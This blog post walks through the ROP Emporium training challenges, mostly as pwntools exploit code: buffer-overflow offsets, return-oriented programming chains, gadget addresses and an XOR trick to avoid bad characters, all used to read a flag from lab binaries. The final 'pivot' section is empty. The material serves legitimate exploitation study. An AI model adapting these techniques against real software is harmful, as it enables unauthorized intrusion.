---
title: "ROP Emporium Revisited"
categories: ["Hacking", "Binary Exploitation"]
tags: ["hacking", "pentesting", "pwntools", "Exploit Development"]
date: "2021-07-27"
type: "post"
weight: 400
keywords: "hacking rop pwntools"
---

## Overview



> ROP highlights a classical strategy across all facets of security exploitation, living off the land.



## ret2win #2

`ret2win` is the first challenge among the rop emporium suite and plays out like a classical [buffer overflow](../basic-stack-based-overflows). The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.


```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We see that the `NX` bit is **enabled** this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode. We note however that we can still control the return pointer and thus redirect code execution. Our goal is to call the `ret2win` function, but why can we even call this function?

If you understand the notion off living off the land you will recognize the key utility of ROP and why it can be used to circumvent no execute (`NX`) memory protections. The instructions we execute *already exist within the program* after compilation.

In this case that code is the win function `ret2win` but there are many other instructions within the binary, some which are never even used by the program in its running lifetime ... 

Compilers are not perfect programs, and indeed `x86` as an instruction set has its oddities, they leave behind garbage instructions as well as carrying out other weird behavior. 

> These leftover instructions, often called 'gadgets', can be of great use to us.

They are an example of a [weird machine](https://en.wikipedia.org/wiki/Weird_machine). We will explore their utility in detail as we continue but for now know they exist alongside the functions and other instructions that make up the program.

With this understanding, we proceed by fuzzing the offset to the return pointer with cyclic (yes even tho it tells us the bytes to overwrite). We can then hook `ret2win` from the symbols table and use `fit/flat` to pad the offset to our packed address.

The exploit for the 32 bit binary (this is the track we will follow) is as follows.


```python
from pwn import *
proc = process('./ret2win32')

## get da banner
log.info('Receiving banner ...')

payload = fit({
    cyclic_find('laaa'): p32(elf.symbols['ret2win'])
})

proc.sendafter('> ', payload)
# shellit
proc.interactive()
```

## split

```python
rop.call(elf.symbols['system'], [next(elf.search(b'/bin/cat flag.txt'))])
payload = fit({
    cyclic_find('laaa'): rop.chain()
})

proc.sendlineafter('> ', payload)
# shellit
proc.interactive()
```


## write4


```python
# ::::::::::: .data at this address is uninitialized ::::::::::

#data_section = elf.get_section_by_name('.data').header.sh_addr

# better way
data_section = elf.symbols.data_start
log.success(f".data starts @{hex(data_section)}")
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::

# pwntools hides some gadgets from us so we resolve via
# function
mov_gadget = elf.symbols['usefulGadgets']
log.success(f"gadget: mov [edi], ebp; ret; @ {mov_gadget}")

# this lookup fails if the list of registers to pop cannot 
# be met
pop_gadget = rop.search(0, ['edi', 'ebp'], 'regs').address
log.success(f"pop gadget: pop edi; pop ebp; ret; @ {hex(pop_gadget)}")

print("\n")
log.info("::: Beginning write sequence for 'flag.txt' ::: \n")
log.info("Writing .data address to edi, 'flag' to ebp ...")
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# :::::::::::::::::::::::: create chain :::::::::::::::::::::::
rop.raw([
    pop_gadget,             # pop edi; pop ebp; ret;
    data_section,
    'flag',                 # write first 4 bytes of 'flag.txt'
    mov_gadget,             # mov [edi], ebp; ret;

    pop_gadget,             # pop edi; pop ebp; ret;
    data_section + 4,
    '.txt',                 
    mov_gadget              # mov [edi], ebp; ret;
])
# printfile arg in .data
rop.print_file(data_section)                     

payload = fit({
    cyclic_find('laaa'): rop.chain()
})

# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# shellit
proc.sendlineafter('> ', payload)    
proc.interactive()
```



## badchars

```python
# :::::::::::::::::::::::::::: setup ::::::::::::::::::::::::::
badchars = enhex(b'xga.')           # convert badchars to hex
bet = 'bcdefhijklmnopqrstuvwyz'     # cleansed alphabet
data_section = elf.symbols.data_start
log.success(f".data starts @{hex(data_section)}")
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::
ret_gadget = 0x08048386                              # ret
xor_gadget = elf.symbols['usefulGadgets'] + 4        # xor  BYTE PTR [ebp+0x0], bl
mov_gadget = elf.symbols['usefulGadgets'] + 12       # mov  DWORD PTR [edi], esi
pop_gadget = 0x080485b9                              # pop esi; pop edi; pop ebp;
pop_ebp = 0x080485bb                                 # pop ebp;
pop_ebx = 0x0804839d                                 # pop ebx;
# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# :::::::::::::::::::::::::::: exploit :::::::::::::::::::::::::
target_str = 'flag.txt'
xor_key = 42
encoded_target_str = xor(target_str, xor_key)
flag_str, txt_str = encoded_target_str[:4], encoded_target_str[4:]
log.success(f'Encoded flag: {flag_str.decode()}{txt_str.decode()}')

decoder_chain = b''
offset = 0
# xor's each byte of the xor'd string in the data
# section with the xor key to restore it back to
# the original string 'flag.txt'
for char in encoded_target_str:
    decoder_chain += pack(pop_ebp)
    decoder_chain += pack(data_section + offset)
    decoder_chain += pack(pop_ebx)
    decoder_chain += pack(xor_key)
    decoder_chain += pack(xor_gadget)
    offset += 1


rop.raw([
    pop_gadget,         # pop esi; pop edi; pop ebp;
    flag_str,           # 'flag' ^ xor_key
    data_section,   
    ret_gadget,         # ebp = ret
    mov_gadget,         # mov  DWORD PTR [edi], esi

    pop_gadget,         # pop esi; pop edi; pop ebp;
    txt_str,            # '.txt' ^ xor_key
    data_section + 4,
    ret_gadget,         # ebp = ret
    mov_gadget,         # mov  DWORD PTR [edi], esi

    decoder_chain       # restore the xor'd flag str
])
rop.print_file(data_section)

payload = fit({
    cyclic_find('nbbb', alphabet=bet): rop.chain(),
}, filler=bet)


proc.sendlineafter('> ', payload)
# shellit
proc.interactive()
```


## fluff

```python
'''
TEMP ← SRC1;
MASK ← SRC2;
DEST ← 0 ;
m← 0, k← 0;
DO WHILE m< OperandSize
    IF MASK[ m] = 1 THEN
        DEST[ k] ← TEMP[ m];
        k ← k+ 1;
    FI
    m ← m+ 1;
OD
'''
def bruteforce_mask_value(mask, target_value):
    """ 
    create the stream of bytes that will produce
    the target value when suppied as an operand to
    the ptex instruction with the given mask
    """
    needed_bytes = []
    
    # logic from @cryptocat
    for char in target_value:
        mask_reversed = bits(mask, endian='little')
        char_bits = bits(u8(char), endian='little')
        
        set_bits_count = 0
        mask_offset = 0
        set_bits = ''
        
        while set_bits_count < len(char_bits) - 1:
            if (char_bits[set_bits_count] == mask_reversed[mask_offset]):
                set_bits += '1'
                set_bits_count += 1
            else:
                set_bits += '0'
            mask_offset += 1
        

        set_bits += '0' * (16 - len(set_bits))
        needed_bytes.append(''.join(reversed(set_bits)))

    return [int(u16(unbits((bit)), endian='big')) for bit in needed_bytes]

def main():
    ## get da banner
    log.info('Receiving banner ...')

    # ::::::::::::::::::::::::::: setup :::::::::::::::::::::::::::
    data_section = elf.symbols.data_start
    log.success(f".data starts @{hex(data_section)}")
    # :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::
    pop_ebp = 0x080485bb            # pop ebp; ret
    # mov eax, ebp; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
    pext_edx = 0x08048543           # ^
    binance_gadget = 0x08048555     # xchg   BYTE PTR [ecx],dl
    pop_ecx_bswap = 0x08048558      # pop ecx ; bswap ecx ; ret
    # ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

    mask_bytes = 0xb0bababa              # from questionableGadgets
    target_str = "flag.txt"
    target_bytes = bruteforce_mask_value(mask_bytes, target_str)
    log.success(f"target bytes: {target_bytes}")

    for offset, byte in enumerate(target_bytes):
        rop.raw([
            pop_ebp,
            byte,
            pext_edx,
            pop_ecx_bswap,
            pack(data_section + offset, endianness='big'),
            binance_gadget
        ])

    rop.print_file(data_section)
    
    payload = flat({
        cyclic_find('laaa'): rop.chain()
    })

    proc.sendlineafter('> ', payload)
    # shellit
    proc.interactive()
```


## pivot

```python

```